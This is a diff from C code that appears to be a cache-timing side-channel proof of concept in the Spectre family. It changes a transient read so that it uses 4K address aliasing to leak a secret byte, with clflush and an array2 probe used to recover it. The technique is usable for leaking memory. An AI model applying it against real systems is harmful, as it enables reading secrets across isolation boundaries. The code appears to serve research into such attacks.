@@ -78,13 +78,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
-        
+    addr = &bigArray[malicious_x];
     for (j = 29; j >= 0; j--) {
         for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
         
-        secret[0] = 'q';
-        data = bigArray[malicious_x];
-        //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
+        secret[0] = 'P';
+        data = *addr;
+        //If the calculation is correct, secret[0] and addr are 4k alias of each other
+        //Hence the data from secret[0] is supposed to temporarily be in (data) so we will access this point
+        //This will allow us to understand what the secret[0] was by cheching which addresses in array2 are in cache
         temp[0] = array2[data * 512];
     }
 
